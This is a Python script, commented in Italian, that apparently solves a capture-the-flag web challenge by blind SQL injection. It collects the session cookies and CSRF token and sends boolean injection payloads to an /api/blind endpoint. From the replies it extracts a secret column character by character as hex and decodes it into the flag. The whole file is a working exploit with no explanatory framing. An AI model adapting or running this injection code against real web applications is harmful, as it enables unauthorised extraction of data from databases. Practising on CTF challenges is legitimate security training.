import requests
from bs4 import BeautifulSoup

class Inj:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        # Effettuiamo una GET alla pagina principale per ottenere i cookie e il CSRF token
        r = self.session.get(self.url)
        r.raise_for_status()
        # Estraiamo il CSRF token dal testo della pagina; modifica il parsing in base all'HTML reale
        try:
            self.csrf = r.text.split("csrf_token =")[1].split("'")[1]
        except IndexError:
            self.csrf = None
        print(f"CSRF token estratto: {self.csrf}")
        # Visualizziamo i cookie di sessione ottenuti
        cookies_dict = self.session.cookies.get_dict()
        print("Cookies ottenuti:", cookies_dict)

    def blind(self, question):
        blind_url = f"{self.url}/api/blind"
        headers = {
            'Content-Type': 'application/json',
            'X-CSRF-Token': self.csrf if self.csrf else "",
        }
        # Costruiamo esplicitamente l'header "Cookie" a partire dai cookie presenti nella sessione
        cookie_header = "; ".join(f"{k}={v}" for k, v in self.session.cookies.get_dict().items())
        if cookie_header:
            headers['Cookie'] = cookie_header

        payload = {
            "query": question,
        }
        try:
            r = self.session.post(blind_url, headers=headers, json=payload)
            r.raise_for_status()
            print("\n=== REQUEST DETAILS ===")
            print(f"URL: {blind_url}")
            print("Headers:")
            for k, v in headers.items():
                print(f"  {k}: {v}")
            print("Payload (JSON):")
            print(payload)
            print("\n=== RESPONSE DETAILS ===")
            print(f"Status Code: {r.status_code}")
            print("Response Text:")
            print(r.text)
            if "Success" in r.text:
                print("DEBUG: SUCCESS condition met.\n")
                return "Success", None
            else:
                print("DEBUG: Condition not met (no 'Success' found).\n")
                return "Failure", None
        except Exception as e:
            print("\n=== ERRORE DURANTE LA RICHIESTA ===")
            print(str(e))
            return "Failure", str(e)

# --- Codice per l'iniezione blind SQL ---
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

print("\n=== AVVIO PROCESSO DI BLIND SQL INJECTION ===")
step = 1

while True:
    found_char = False
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        print("\n--- Step", step, "---")
        print("Risultato corrente:", result)
        print("Testing character:", c)
        response, error = inj.blind(question)
        if response == 'Success':  # Abbiamo trovato una corrispondenza!
            result += c
            print(f"DEBUG: Carattere '{c}' confermato. Nuovo risultato: {result}")
            found_char = True
            step += 1
            break
    if not found_char:
        print("\nDEBUG: Nessun carattere trovato per questa posizione. Terminazione del processo.")
        break
    
# Conversione del risultato (HEX) in ASCII usando Python 3:
result_ascii = bytes.fromhex(result).decode('utf-8')

print("\n=== RISULTATO FINALE ===")
print(f"Flag (in HEX): {result}")
print(f"Flag (in ASCII): {result_ascii}")
